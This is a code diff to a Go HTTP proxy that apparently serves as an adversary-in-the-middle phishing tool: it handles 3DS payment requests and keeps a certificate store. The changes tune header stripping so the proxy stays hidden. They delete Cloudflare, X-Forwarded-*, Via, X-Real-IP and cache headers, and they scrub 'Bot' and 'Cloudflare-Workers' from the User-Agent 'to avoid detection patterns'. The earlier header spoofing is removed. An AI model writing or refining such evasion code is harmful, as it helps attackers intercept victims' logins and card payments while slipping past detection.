@@ -405,26 +405,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				return p.handle3DSRequest(req)
 			}
 
-			// Clean Headers
-			// Remove headers that might expose the proxy
-			removeHeaders := []string{
-				"Content-Security-Policy",
-				"Content-Security-Policy-Report-Only",
-				"Strict-Transport-Security",
-				"X-Frame-Options",
-				"X-Content-Type-Options",
-				"X-XSS-Protection",
-				"Public-Key-Pins",
-				"Expect-CT",
-				"Server",
-				"X-Powered-By",
-				"Via",
-			}
-			for _, h := range removeHeaders {
-				req.Header.Del(h)
-			}
-
-			// Remove internal Cloudflare headers if present
+			// Clean Headers - only remove proxy-revealing headers
 			proxyFingerprintHeaders := []string{
 				"CF-Connecting-IP",
 				"CF-IPCountry",
@@ -432,6 +413,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				"CF-Visitor",
 				"X-Original-URL",
 				"X-Rewrite-URL",
+				"X-Forwarded-For",
+				"X-Forwarded-Host",
+				"X-Forwarded-Proto",
+				"Forwarded",
+				"Via",
+				"X-Real-IP",
 			}
 			for _, h := range proxyFingerprintHeaders {
 				req.Header.Del(h)
@@ -439,38 +426,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// Normalize User-Agent to avoid detection patterns
 			if ua := req.Header.Get("User-Agent"); ua != "" {
-				// Remove suspicious UA patterns
 				ua = strings.ReplaceAll(ua, "Cloudflare-Workers", "")
 				ua = strings.ReplaceAll(ua, "Bot", "")
 				req.Header.Set("User-Agent", strings.TrimSpace(ua))
 			}
 
-			// Add realistic Accept headers if missing
-			if req.Header.Get("Accept") == "" {
-				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
-			}
-
-			if req.Header.Get("Accept-Language") == "" {
-				req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-			}
-
-			if req.Header.Get("Accept-Encoding") == "" {
-				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
-			}
-
-			// Add Sec-Fetch-* headers to appear as browser navigation
-			if req.Header.Get("Sec-Fetch-Dest") == "" {
-				req.Header.Set("Sec-Fetch-Dest", "document")
-			}
-			if req.Header.Get("Sec-Fetch-Mode") == "" {
-				req.Header.Set("Sec-Fetch-Mode", "navigate")
-			}
-			if req.Header.Get("Sec-Fetch-Site") == "" {
-				req.Header.Set("Sec-Fetch-Site", "none")
-			}
-			if req.Header.Get("Sec-Fetch-User") == "" {
-				req.Header.Set("Sec-Fetch-User", "?1")
-			}
+			// Preserve browser-sent headers, only add if truly missing
+			// Modern browsers send these automatically, so don't override
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
@@ -1433,16 +1395,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// Remove security headers that could expose proxy
-			securityHeaders := []string{
-				"Server",
-				"X-Powered-By",
-				"X-AspNet-Version",
-				"X-Runtime",
+			// Remove proxy-revealing response headers
+			proxyResponseHeaders := []string{
 				"Via",
 				"X-Proxy-ID",
 				"X-Forwarded-Server",
+				"X-Cache",
+				"X-Cache-Lookup",
 			}
-			for _, hdr := range securityHeaders {
+			for _, hdr := range proxyResponseHeaders {
 				resp.Header.Del(hdr)
 			}
 
